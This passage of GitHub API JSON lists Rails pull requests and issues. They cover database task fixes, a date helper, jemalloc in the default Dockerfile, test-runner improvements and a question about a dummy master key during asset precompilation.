        "body": "### Motivation / Background\r\n\r\nFixes #50672\r\n\r\n### Detail\r\n\r\nThe task `db:schema:load:#{name}` depends on `db:test:purge:#{name}` since adb64db which requires the DB config to be present, otherwise an error is raised.\r\n\r\n```\r\n$ bin/rails db:schema:load:one --trace\r\n** Invoke db:schema:load:one (first_time)\r\n** Invoke db:test:purge:one (first_time)\r\n** Invoke db:load_config (first_time)\r\n** Invoke environment (first_time)\r\n** Execute environment\r\n** Execute db:load_config\r\n** Invoke db:check_protected_environments (first_time) ** Invoke db:load_config\r\n** Execute db:check_protected_environments\r\n** Execute db:test:purge:one\r\n** Execute db:schema:load:one\r\n```\r\n\r\nThis commit fixes the problem by returning early when the DB config is indeed missing.\r\n\r\n### Additional information\r\n\r\nThe task `db:schema:load` may need to be updated to depend on `db:test:purge` too, to keep it consistent with `db:schema:load:#{name}`.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50946/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50946/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50945",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50945/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50945/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50945/events",
        "html_url": "https://github.com/rails/rails/pull/50945",
        "id": 2113809897,
        "node_id": "PR_kwDNIULOZcV_yg",
        "number": 50945,
        "title": "Introduce today_or_future? method",
        "user": {
            "login": "olimart",
            "id": 547754,
            "node_id": "MDQ6VXNlcjU0Nzc1NA==",
            "avatar_url": "https://avatars.githubusercontent.com/u/547754?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/olimart",
            "html_url": "https://github.com/olimart",
            "followers_url": "https://api.github.com/users/olimart/followers",
            "following_url": "https://api.github.com/users/olimart/following{/other_user}",
            "gists_url": "https://api.github.com/users/olimart/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/olimart/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/olimart/subscriptions",
            "organizations_url": "https://api.github.com/users/olimart/orgs",
            "repos_url": "https://api.github.com/users/olimart/repos",
            "events_url": "https://api.github.com/users/olimart/events{/privacy}",
            "received_events_url": "https://api.github.com/users/olimart/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-02T00:44:50Z",
        "updated_at": "2024-02-10T00:38:41Z",
        "closed_at": "2024-02-09T23:54:36Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50945",
            "html_url": "https://github.com/rails/rails/pull/50945",
            "diff_url": "https://github.com/rails/rails/pull/50945.diff",
            "patch_url": "https://github.com/rails/rails/pull/50945.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request introduces a convenient helper to check if a date/time is either today or in the future.\r\n\r\nDrawing inspiration from https://github.com/rails/rails/pull/46786 which introduces `.local?` helper for environment check.\r\n\r\n### Detail\r\n\r\nThis Pull Request changes:\r\n- `ActiveSupport::TimeWithZone`\r\n-  `DateAndTime::Calculations`\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50945/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50945/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50944",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50944/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50944/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50944/events",
        "html_url": "https://github.com/rails/rails/pull/50944",
        "id": 2113736717,
        "node_id": "PR_kwDNIULOZcR4oQ",
        "number": 50944,
        "title": "Enable DependencyTracker to evaluate interpolated paths",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-01T23:46:28Z",
        "updated_at": "2024-02-02T19:50:39Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50944",
            "html_url": "https://github.com/rails/rails/pull/50944",
            "diff_url": "https://github.com/rails/rails/pull/50944.diff",
            "patch_url": "https://github.com/rails/rails/pull/50944.patch",
            "merged_at": null
        },
        "body": "Previously, neither the PrismRenderParser nor the RipperRenderParser would consider an interpolated string as a dependency. The RubyTracker even included a line to explcitly filter out interpolated paths returned from the RipperRenderParser since they would end in a \"/\". However, the RubyTracker does include the ability to evaluate explicit \"Template Dependency\" comments with wildcard nodes.\r\n\r\nThis commit extends the RipperRenderParser and PrismRenderParser to convert interpolated strings into wildcard globs. Additionally, it changes the RubyTracker to evaluate wildcards the same for both implicit and explicit dependencies. This enables the RubyTracker to identify potential dependencies for interpolated renders, which it was previously unable to do.\r\n\r\ncc @jhawthorn if you think this is a good idea I can try to apply it to ActionView::Precompiler as well\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50944/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50944/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50943",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50943/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50943/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50943/events",
        "html_url": "https://github.com/rails/rails/pull/50943",
        "id": 2113672199,
        "node_id": "PR_kwDNIULOZcOUzA",
        "number": 50943,
        "title": "Setup jemalloc in default Dockerfile to optimize memory allocation",
        "user": {
            "login": "northeastprince",
            "id": 55164724,
            "node_id": "MDQ6VXNlcjU1MTY0NzI0",
            "avatar_url": "https://avatars.githubusercontent.com/u/55164724?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/northeastprince",
            "html_url": "https://github.com/northeastprince",
            "followers_url": "https://api.github.com/users/northeastprince/followers",
            "following_url": "https://api.github.com/users/northeastprince/following{/other_user}",
            "gists_url": "https://api.github.com/users/northeastprince/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/northeastprince/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/northeastprince/subscriptions",
            "organizations_url": "https://api.github.com/users/northeastprince/orgs",
            "repos_url": "https://api.github.com/users/northeastprince/repos",
            "events_url": "https://api.github.com/users/northeastprince/events{/privacy}",
            "received_events_url": "https://api.github.com/users/northeastprince/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 5,
        "created_at": "2024-02-01T22:55:15Z",
        "updated_at": "2024-02-12T13:15:47Z",
        "closed_at": "2024-02-04T09:06:54Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50943",
            "html_url": "https://github.com/rails/rails/pull/50943",
            "diff_url": "https://github.com/rails/rails/pull/50943.diff",
            "patch_url": "https://github.com/rails/rails/pull/50943.patch",
            "merged_at": "2024-02-04T09:06:53Z"
        },
        "body": "[Ruby's use of `malloc` can create memory fragmentation problems, especially when using multiple threads](https://www.speedshop.co/2017/12/04/malloc-doubles-ruby-memory.html) like Puma does. Switching to an allocator that uses different patterns to avoid fragmentation can decrease memory usage by a substantial margin.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50943/reactions",
            "total_count": 3,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 3,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50943/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50942",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50942/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50942/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50942/events",
        "html_url": "https://github.com/rails/rails/pull/50942",
        "id": 2113629008,
        "node_id": "PR_kwDNIULOZcL4hw",
        "number": 50942,
        "title": "Improve the output of RailsInspect::Cli",
        "user": {
            "login": "andrewn617",
            "id": 39735028,
            "node_id": "MDQ6VXNlcjM5NzM1MDI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/39735028?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/andrewn617",
            "html_url": "https://github.com/andrewn617",
            "followers_url": "https://api.github.com/users/andrewn617/followers",
            "following_url": "https://api.github.com/users/andrewn617/following{/other_user}",
            "gists_url": "https://api.github.com/users/andrewn617/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/andrewn617/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/andrewn617/subscriptions",
            "organizations_url": "https://api.github.com/users/andrewn617/orgs",
            "repos_url": "https://api.github.com/users/andrewn617/repos",
            "events_url": "https://api.github.com/users/andrewn617/events{/privacy}",
            "received_events_url": "https://api.github.com/users/andrewn617/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-02-01T22:31:15Z",
        "updated_at": "2024-02-01T23:15:11Z",
        "closed_at": "2024-02-01T23:15:01Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50942",
            "html_url": "https://github.com/rails/rails/pull/50942",
            "diff_url": "https://github.com/rails/rails/pull/50942.diff",
            "patch_url": "https://github.com/rails/rails/pull/50942.patch",
            "merged_at": "2024-02-01T23:15:01Z"
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because I want to improve the output of `RailsInspector::Cli`. The first time I ran into an error from rails inspector, I was confused what it wanted me to do and had to read through the code to understand that I was missing adding my new configuration to `cofiguring.md`.\r\n\r\n### Detail\r\n\r\nThis Pull Request adds and additional line to the output of rails inspector to give the developer more direction, and also prompt them to use the `--autocorrect` flag.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50942/reactions",
            "total_count": 1,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 1,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50942/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50941",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50941/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50941/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50941/events",
        "html_url": "https://github.com/rails/rails/pull/50941",
        "id": 2113553144,
        "node_id": "PR_kwDNIULOZcHmFg",
        "number": 50941,
        "title": "Retry `ActionableError`s when running tests",
        "user": {
            "login": "andrewn617",
            "id": 39735028,
            "node_id": "MDQ6VXNlcjM5NzM1MDI4",
            "avatar_url": "https://avatars.githubusercontent.com/u/39735028?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/andrewn617",
            "html_url": "https://github.com/andrewn617",
            "followers_url": "https://api.github.com/users/andrewn617/followers",
            "following_url": "https://api.github.com/users/andrewn617/following{/other_user}",
            "gists_url": "https://api.github.com/users/andrewn617/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/andrewn617/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/andrewn617/subscriptions",
            "organizations_url": "https://api.github.com/users/andrewn617/orgs",
            "repos_url": "https://api.github.com/users/andrewn617/repos",
            "events_url": "https://api.github.com/users/andrewn617/events{/privacy}",
            "received_events_url": "https://api.github.com/users/andrewn617/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107194,
                "node_id": "MDU6TGFiZWwxMDcxOTQ=",
                "url": "https://api.github.com/repos/rails/rails/labels/activesupport",
                "name": "activesupport",
                "color": "FC9300",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            },
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-01T21:50:43Z",
        "updated_at": "2024-02-15T19:23:58Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50941",
            "html_url": "https://github.com/rails/rails/pull/50941",
            "diff_url": "https://github.com/rails/rails/pull/50941.diff",
            "patch_url": "https://github.com/rails/rails/pull/50941.patch",
            "merged_at": null
        },
        "body": "### Motivation / Background\r\n\r\nThis Pull Request has been created because I want to make it easier to retry actionable errors that occur when running tests. Rails already knows how to recover these errors, so lets make it possible for the user to recover from them and run their tests without exiting the process.\r\n\r\n### Detail\r\n\r\nAllow Actionable Errors encountered when running tests to be retried. This can be configured by `config.actionable_command_line_errors` and is `true` in the test environment unless the `\"CI\"` env variable is set, and false otherwise.\r\n\r\n    \r\n    Migrations are pending. To resolve this issue, run:\r\n    \r\n            bin/rails db:migrate\r\n    \r\n    You have 1 pending migration:\r\n    \r\n    db/migrate/20240201213806_add_a_to_b.rb\r\n    Run pending migrations? [Yn] Y\r\n    == 20240201213806 AddAToB: migrating =========================================\r\n    == 20240201213806 AddAToB: migrated (0.0000s) ================================\r\n    \r\n    Running 7 tests in a single process (parallelization threshold is 50)\r\n    Run options: --seed 22200\r\n    \r\n    # Running:\r\n    \r\n    .......\r\n    \r\n    Finished in 0.243394s, 28.7600 runs/s, 45.1942 assertions/s.\r\n    7 runs, 11 assertions, 0 failures, 0 errors, 0 skips\r\n    \r\n\r\n### Additional information\r\n\r\nRight now this is only implemented in the Test Runner, but I'd also like to follow up with a similar implementation for `Rails::Command::CorrectableNameError`s.\r\n\r\nAlso we could introduce a new framework default for the configuration if this is the direction in this PR is acceptable.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50941/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50941/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50940",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50940/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50940/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50940/events",
        "html_url": "https://github.com/rails/rails/pull/50940",
        "id": 2113449869,
        "node_id": "PR_kwDNIULOZcB1yg",
        "number": 50940,
        "title": "Use ActiveSupport::TestCase for Tracker tests",
        "user": {
            "login": "skipkayhil",
            "id": 6014046,
            "node_id": "MDQ6VXNlcjYwMTQwNDY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/6014046?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/skipkayhil",
            "html_url": "https://github.com/skipkayhil",
            "followers_url": "https://api.github.com/users/skipkayhil/followers",
            "following_url": "https://api.github.com/users/skipkayhil/following{/other_user}",
            "gists_url": "https://api.github.com/users/skipkayhil/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/skipkayhil/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/skipkayhil/subscriptions",
            "organizations_url": "https://api.github.com/users/skipkayhil/orgs",
            "repos_url": "https://api.github.com/users/skipkayhil/repos",
            "events_url": "https://api.github.com/users/skipkayhil/events{/privacy}",
            "received_events_url": "https://api.github.com/users/skipkayhil/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T20:46:24Z",
        "updated_at": "2024-02-01T23:42:43Z",
        "closed_at": "2024-02-01T23:39:02Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50940",
            "html_url": "https://github.com/rails/rails/pull/50940",
            "diff_url": "https://github.com/rails/rails/pull/50940.diff",
            "patch_url": "https://github.com/rails/rails/pull/50940.patch",
            "merged_at": "2024-02-01T23:39:02Z"
        },
        "body": "Minitest::Test does not support all of the same options as ActiveSupport::TestCase, such as running bin/test <filename>:<lineno> and -n /regex/. Trying to use these options on this file would just run all of the Minitest::Tests no matter what options were passed.\r\n\r\nThis commit fixes the ability to use those options by using ActiveSupport::TestCase (like every other test in the repo).\r\n\r\nBefore:\r\n\r\n```\r\n$ bin/test test/template/dependency_tracker_test.rb:217\r\nRunning 59 tests in parallel using 8 processes\r\nRun options: --seed 42725\r\n\r\n.........................................................\r\n\r\nFinished in 0.322759s, 176.6024 runs/s, 176.6024 assertions/s.\r\n57 runs, 57 assertions, 0 failures, 0 errors, 0 skips\r\n```\r\n\r\nAfter:\r\n\r\n```\r\n$ bin/test test/template/dependency_tracker_test.rb:217\r\nRunning 59 tests in parallel using 8 processes\r\nRun options: --seed 15213\r\n\r\n...\r\n\r\nFinished in 0.359162s, 8.3528 runs/s, 8.3528 assertions/s.\r\n3 runs, 3 assertions, 0 failures, 0 errors, 0 skips\r\n```\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50940/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50940/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50939",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50939/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50939/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50939/events",
        "html_url": "https://github.com/rails/rails/issues/50939",
        "id": 2112729539,
        "node_id": "I_kwDNIULOfe2xww",
        "number": 50939,
        "title": "Should there be a RAILS_MASTER_KEY_DUMMY like SECRET_KEY_BASE_DUMMY?",
        "user": {
            "login": "dorianmariecom",
            "id": 58794487,
            "node_id": "MDQ6VXNlcjU4Nzk0NDg3",
            "avatar_url": "https://avatars.githubusercontent.com/u/58794487?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmariecom",
            "html_url": "https://github.com/dorianmariecom",
            "followers_url": "https://api.github.com/users/dorianmariecom/followers",
            "following_url": "https://api.github.com/users/dorianmariecom/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmariecom/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmariecom/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmariecom/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmariecom/orgs",
            "repos_url": "https://api.github.com/users/dorianmariecom/repos",
            "events_url": "https://api.github.com/users/dorianmariecom/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmariecom/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-01T14:57:42Z",
        "updated_at": "2024-02-09T03:40:18Z",
        "closed_at": "2024-02-09T03:40:18Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n\r\nHave a rails app with `config.require_master_key = true`\r\n\r\n```\r\nRAILS_ENV=production SECRET_KEY_BASE_DUMMY=1 bin/rails assets:precompile\r\n```\r\n\r\n### Expected behavior\r\n\r\nIt ignores the master key requirement?\r\n\r\n### Actual behavior\r\n\r\nError:\r\n\r\n```\r\nMissing encryption key to decrypt file with. Ask your team for your master key and write it to /rails/config/master.key or put it in the ENV['RAILS_MASTER_KEY'].\r\n```\r\n\r\n### System configuration\r\n**Rails version**: Rails 7.1.3\r\n**Ruby version**: ruby 3.2.3 (2024-01-18 revision 52bb2ac0a6) [arm64-darwin23]\r\n\r\n----\r\n\r\nWhat about a RAILS_MASTER_KEY_DUMMY=1?",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50939/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50939/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50938",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50938/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50938/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50938/events",
        "html_url": "https://github.com/rails/rails/pull/50938",
        "id": 2112546336,
        "node_id": "PR_kwDNIULOZbPi_A",
        "number": 50938,
        "title": "Refactor QueryCache to be owned by the pool",
        "user": {
            "login": "casperisfine",
            "id": 19192189,
            "node_id": "MDQ6VXNlcjE5MTkyMTg5",
            "avatar_url": "https://avatars.githubusercontent.com/u/19192189?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/casperisfine",
            "html_url": "https://github.com/casperisfine",
            "followers_url": "https://api.github.com/users/casperisfine/followers",
            "following_url": "https://api.github.com/users/casperisfine/following{/other_user}",
            "gists_url": "https://api.github.com/users/casperisfine/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/casperisfine/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/casperisfine/subscriptions",
            "organizations_url": "https://api.github.com/users/casperisfine/orgs",
            "repos_url": "https://api.github.com/users/casperisfine/repos",
            "events_url": "https://api.github.com/users/casperisfine/events{/privacy}",
            "received_events_url": "https://api.github.com/users/casperisfine/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-01T13:40:41Z",
        "updated_at": "2024-02-14T12:34:11Z",
        "closed_at": "2024-02-14T10:24:08Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50938",
            "html_url": "https://github.com/rails/rails/pull/50938",
            "diff_url": "https://github.com/rails/rails/pull/50938.diff",
            "patch_url": "https://github.com/rails/rails/pull/50938.patch",
            "merged_at": "2024-02-14T10:24:08Z"
        },
        "body": "Ref: https://github.com/rails/rails/pull/50793\r\n\r\nIf we want to stop caching the checked out connections, then we must persist the cache in the pool, and assign it to the connection when it's checked out.\r\n\r\nThe pool become responsible for managing the cache lifecycle.\r\n\r\nThis also open the door to sharing the cache between multiple connections, which is valuable for read replicas, etc.\r\n\r\nThis change only really make sense if we go through with no longer caching checked out connections. Otherwise it's just extra complexity.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50938/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50938/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50937",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50937/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50937/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50937/events",
        "html_url": "https://github.com/rails/rails/pull/50937",
        "id": 2112337818,
        "node_id": "PR_kwDNIULOZbD_3A",
        "number": 50937,
